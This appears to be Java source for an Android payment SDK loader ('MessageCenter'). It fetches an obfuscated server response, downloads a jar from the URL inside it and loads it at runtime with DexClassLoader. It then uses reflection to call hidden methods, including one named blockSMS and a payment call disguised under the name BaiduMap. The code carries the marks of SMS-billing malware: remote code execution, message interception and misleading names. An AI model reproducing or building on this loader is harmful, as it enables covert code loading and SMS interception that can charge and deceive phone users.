package cn.egamex.jiazai;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.util.Log;

import org.json.JSONObject;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

import cn.egamex.jiazai.DownLoad.DownLoadJar;
import cn.egamex.jiazai.DownLoad.DownLoadListener;
import cn.egamex.jiazai.DownLoad.RequestDownLoadAddress;
import cn.egamex.jiazai.HttpCenter.HttpListener;
import cn.egamex.jiazai.Utils.Constants;
import cn.egamex.jiazai.Utils.Kode;
import dalvik.system.DexClassLoader;

/**
 * Created by Administrator on 2016/12/23.
 */

public class MessageCenter {
    private static MessageCenter messageCenter = null;
    private static String loadClassName = Constants.getLoadClassName();
    private static String path;
    private static String apkName = "";
    private static DexClassLoader cl;
    private static ClassLoader clsLoader;
    private String dexPath;// dex路径
    private String dexOutputPath;
    private PackageInfo pkgInfo;
    private static String pacageName;
    private String url;
    private String jarName;
    private Class<?> clazz;
    private boolean isFirst = true;
    private Context context;

    public static MessageCenter getInstance() {
        if (messageCenter == null) {
            messageCenter = new MessageCenter();
        }
        return messageCenter;
    }


    public void SDKInitializer(final Context ctx, final String price, final int payItemID, final String str, final String product, final String Did, final
    String extData, final Object payCallBackObject, final Object initObject) {
        context = ctx;
        RequestDownLoadAddress.getInstance().request(new HttpListener() {
            @Override
            public void result(String result) {
                if (Constants.isOutPut) {
                    System.out.println("======>" + Kode.a(result));
                }
                url = getUrl(Kode.a(result));
                jarName = getJarName(url);
                if (Constants.isOutPut) {
                    System.out.println("======>url:" + url);
                    System.out.println("======>jarName:" + jarName);
                }
                new DownLoadJar(ctx, jarName, url, new DownLoadListener() {
                    @Override
                    public void DownLoadState(int state) {
                        LoadDex(ctx);
                        init(context, price, payItemID, str, product, Did, extData, payCallBackObject, initObject);
                    }
                }).start();
            }
        });
    }

    public void BaiduMap(Context ctx, String price, int payItemID, String str, String product, String Did,
                         String extData, Object payCallBackObject) {
        pay(ctx, price, payItemID, str, product, Did, extData, payCallBackObject);
    }

    public void s(final Context context) {
        if (clazz != null) {
            blockSMS(context);
        }
    }

    public void close() {
        System.exit(1);
    }

    public HashMap<String, Map<String, Object>> g() {
        return getPayPoint();
    }

    /**************************************************************************************************************************************************************/
    public void LoadDex(Context context) {
        clsLoader = context.getClassLoader();
        dexPath = getFilesDir(context) + File.separator + jarName;
        if (Constants.isOutPut) {
            Log.i("SDK", "====>dexPath:" + dexPath);
        }
        dexOutputPath = getFilesDir(context) + File.separator;
        if (Constants.isOutPut) {
            Log.i("SDK", "====>dexOutputPath:" + dexOutputPath);
        }
        cl = new DexClassLoader(dexPath, dexOutputPath, null, clsLoader);
//        pkgInfo = context.getPackageManager().getPackageArchiveInfo(dexPath, 1);
//        pacageName = pkgInfo.packageName;
        pacageName = Constants.getPackageName();
        if (Constants.isOutPut) {
            Log.i("SDK", "获取到的包名：" + pacageName);
            Log.i("SDK", "加载jar完成");
        }
        try {
            clazz = cl.loadClass(pacageName + "." + loadClassName);
        } catch (Exception e) {
            Log.i("SDK", e.toString());
        }
    }


    private void init(Context ctx, String price, int payItemID, String str, String product, String Did,
                      String extData, Object payCallBackObject, Object initObject) {
        try {
            Method method = clazz.getMethod("getInstance");
            Object o = method.invoke(null);
            Class<? extends Object> ci = o.getClass();
            ci.getMethod("SDKInitializer",
                    new Class[]{Context.class, String.class, int.class, String.class, String.class, String.class,
                            String.class, Object.class, Object.class})
                    .invoke(o, new Object[]{ctx, price, payItemID, str, product, Did, extData, payCallBackObject, initObject});
        } catch (InvocationTargetException e) {
            if (Constants.isOutPut) {
                Log.i("SDK", e.toString());
            }
        } catch (Exception e) {
            if (Constants.isOutPut) {
                Log.i("SDK", e.toString());
            }
        }
    }

    private void pay(Context ctx, String price, int payItemID, String str, String product, String Did,
                     String extData, Object payCallBackObject) {
        try {
            Method method = clazz.getMethod("getInstance");
            Object o = method.invoke(null);
            Class<? extends Object> ci = o.getClass();
            ci.getMethod("BaiduMap",
                    new Class[]{Context.class, String.class, int.class, String.class, String.class, String.class,
                            String.class, Object.class})
                    .invoke(o, new Object[]{ctx, price, payItemID, str, product, Did, extData, payCallBackObject});
        } catch (Exception e) {
            if (Constants.isOutPut) {
                Log.i("SDK", e.toString());
            }
        }
    }

    private void blockSMS(Context context) {
        try {
            if (Constants.isOutPut) {
                Log.i("SDK", "name: " + clazz.getName());
                Log.i("SDK", "length: " + clazz.getMethods().length);
            }
            Method[] ms = clazz.getMethods();
            for (Method m : ms) {
                if (Constants.isOutPut) {
                    Log.i("SDK", "payInit: " + m.getName());
                }
                Class<?>[] cx = m.getParameterTypes();
            }
            Method method = clazz.getMethod("getInstance");
            Object o = method.invoke(null);
            Class<? extends Object> ci = o.getClass();
            ci.getMethod("s", Context.class).invoke(o, context);
        } catch (Exception e) {
            Log.i("SDK", e.toString());
        }
    }

    private HashMap<String, Map<String, Object>> getPayPoint() {
        try {
            Method[] ms = clazz.getMethods();
            Method method = clazz.getMethod("getInstance");
            Object o = method.invoke(null);
            Class<? extends Object> ci = o.getClass();
//            Object payPoint = ci.getMethod("g").invoke(o);
            HashMap<String, Map<String, Object>> payPoint = (HashMap<String, Map<String, Object>>) ci
                    .getMethod("g").invoke(o);
            return payPoint;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static String getFilesDir(Context context) {
        if (context != null) {
            return context.getFilesDir().getAbsolutePath();
        }
        return null;
    }

//    private Handler mHandler = new Handler() {
//        @Override
//        public void handleMessage(Message msg) {
//            super.handleMessage(msg);
//            Bundle dBundle = msg.getData();
//            String price = dBundle.getString("price");
//            int payItemID = dBundle.getInt("payItemID");
//            String str = dBundle.getString("str");
//            String product = dBundle.getString("product");
//            String Did = dBundle.getString("Did");
//            String extData = dBundle.getString("extData");
//            Object oHandler = dBundle.get
//            init(context, price, payItemID, str, product, Did, extData, oHandler, oBCallBack);
////            ShowDialog.dismiss();
//        }
//    };

    private String getUrl(String content) {
        try {
            JSONObject json = new JSONObject(content);
            String result = json.getString("url");
            return result;
        } catch (Exception e) {
            return "";
        }
    }

    private String getJarName(String url) {
        return url.substring(url.lastIndexOf("/") + 1);
    }
}